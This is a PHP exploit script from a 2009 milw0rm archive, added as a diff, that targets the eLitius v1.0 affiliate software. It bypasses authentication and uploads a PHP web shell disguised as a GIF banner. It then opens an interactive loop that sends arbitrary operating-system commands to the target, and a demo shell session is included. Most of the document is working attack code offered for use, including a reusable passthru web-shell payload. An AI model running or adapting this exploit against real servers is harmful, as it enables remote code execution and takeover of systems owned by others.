@@ -1,0 +1,170 @@
+<?php
+//786
+/*
+==============================================================================
+                      _      _       _          _      _   _ 
+                     / \    | |     | |        / \    | | | |
+                    / _ \   | |     | |       / _ \   | |_| |
+                   / ___ \  | |___  | |___   / ___ \  |  _  |
+   IN THE NAME OF /_/   \_\ |_____| |_____| /_/   \_\ |_| |_|
+                                                             
+
+==============================================================================
+                      ____   _  _     _   _    ___    _  __
+                     / ___| | || |   | \ | |  / _ \  | |/ /
+                    | |  _  | || |_  |  \| | | | | | | ' / 
+                    | |_| | |__   _| | |\  | | |_| | | . \ 
+                     \____|    |_|   |_| \_|  \___/  |_|\_\ I'm From Iran...
+
+==============================================================================
+	eLitius v1.0 Remote Command Execution Exploit
+==============================================================================
+
+	[ª] Script:.............[ eLitius v1.0 ]..............................
+	[ª] Website:............[ http://www.elitius.com/ ]...................
+	[ª] Today:..............[ 30042009 ]..................................
+	[ª] Founder:............[ G4N0K | mail[o]ganok[sh!t]gmail.com ].......
+
+
+	[!] What is going on...
+	---------------------------------
+	00. Auth Bypass...
+	01. Arbitrary File upload (MIME-Type Spoofing)...
+
+	
+    [+] demo...
+	---------------------------------
+	xpl.php 127.0.0.1 /eLitius_v_1_0/
+		
+        +-------------------------------------------------------------+
+        |        eLitius v1.0 Remote Command Execution Exploit        |
+        |              by: G4N0K | mail[o]ganok[ta]com                |
+        |             Thanks: ALLAH, MSD, SMN, AMD, AFN               |
+        +-------------------------------------------------------------+
+
+
+    [+] Trying to exploit 127.0.0.1...
+
+    [+] File has been uploaded...
+
+    [+] Now you can exec your commands...
+
+php-shell@127.0.0.1# dir
+ Volume in drive E has no label.
+ Volume Serial Number is 042D-D300
+
+ Directory of E:\www\eLitius_v_1_0\admin\banners
+
+09/09/2009  03:01 AM    <DIR>          .
+09/09/2009  03:01 AM    <DIR>          ..
+09/09/2009  07:58 PM           104,747 1.gif
+09/09/2009  03:01 AM                89 banner_ditails.php
+09/09/2009  07:58 PM           104,747 DEH-P9800BT remote control.gif
+09/09/2009  08:33 AM            19,638 sponimage.php.gif
+               4 File(s)        232,681 bytes
+               2 Dir(s)     125,026,304 bytes free
+php-shell@127.0.0.1# exit
+C:\>
+
+*/
+error_reporting(0);
+
+if (php_sapi_name() <> "cli") {
+	die("WTF, Run Me From CommandLine...");
+}
+if ($argc <> 3){__nfo();__usg();exit;}
+$hst = $argv[1];
+$pth = $argv[2];
+
+function __snd($hst, $pkt)
+{
+	$socket = fsockopen($hst, 80, $errno, $errstr, 30);
+	$ggg='';
+	if (!$socket) {
+		echo "\r\n    [+] Socket err#: $errstr ($errno)\n\r";exit;
+	} else {
+		fwrite($socket, $pkt);
+		while (!feof($socket)) {
+			$g4n0k.=fgets($socket, 2048);
+		}
+		fclose($socket);
+		return $g4n0k;
+	}
+}
+
+function __srch($wt){
+	$pos = strpos($wt, 'gnkgnkgnk');
+	$pos_end = strrpos($wt, 'gnkgnkgnk');
+	if (!$pos && !$pos_end){echo " [!] error...\r\n";}
+	$rest = substr($wt, $pos+9, ($pos_end - ($pos+9)));
+	return $rest;
+}
+
+function __nfo()
+{
+$ganok = <<<EOL
+	
+        +-------------------------------------------------------------+
+        |        eLitius v1.0 Remote Command Execution Exploit        |
+        |              by: G4N0K | mail[o]ganok[ta]com                |
+        |             Thanks: ALLAH, MSD, SMN, AMD, AFN               |
+        +-------------------------------------------------------------+
+\r\n
+EOL;
+print $ganok;
+}
+
+function __usg()
+{
+echo <<<GNK
+        uasge...:
+		  xpl.php host path
+		  xpl.php 127.0.0.1 /eLitius_v_1_0/
+GNK;
+}
+
+
+$joke = '-----------------------------3902153292
+Content-Disposition: form-data; name="userfile"; filename="banner_ditails.php"
+Content-Type: image/gif
+
+<?php error_reporting(0);print("gnkgnkgnk");passthru($_GET["gnk"]);print("gnkgnkgnk"); ?>
+-----------------------------3902153292
+Content-Disposition: form-data; name="fileupload"
+
+Upload
+-----------------------------3902153292
+Content-Disposition: form-data; name="directory"
+
+banners
+-----------------------------3902153292--
+';
+
+$msd_pyld  = "POST {$pth}admin/uploadimage.php HTTP/1.1\r\n";
+$msd_pyld .= "Host: {$hst}\r\n";
+$msd_pyld .= "Keep-Alive: 300\n\r";
+$msd_pyld .= "Connection: keep-alive\r\n";
+$msd_pyld .= "Content-Length: ".strlen($joke)."\r\n";
+$msd_pyld .= "Content-Type: multipart/form-data; boundary=---------------------------3902153292\r\n\r\n";
+$msd_pyld .= $joke;
+
+__nfo();
+echo "\r\n    [+] Trying to exploit {$hst}...\n\r";
+if (stristr(__snd($hst, $msd_pyld), "uploaded")){
+	echo "\r\n    [+] File has been uploaded...\n\r\r\n    [+] Now you can exec your commands...\r\n"; } else {
+	echo "\r\n    [+] Oops!, Upload failed.\n\r"; exit;
+}
+
+while(1)
+{
+	echo "\r\nphp-shell@{$hst}# ";
+	if (($cmd = str_replace (" ", "%20", trim(fgets(STDIN)))) == "exit") exit;
+	$smn_pyld  = "GET {$pth}admin/banners/banner_ditails.php?gnk=".$cmd." HTTP/1.1\r\n";
+	$smn_pyld .= "Host: {$hst}\r\n";
+	$smn_pyld .= "Connection: close\n\r\n\r";
+	print __srch(__snd($hst, $smn_pyld));
+}
+
+?>
+
+# milw0rm.com [2009-05-04]
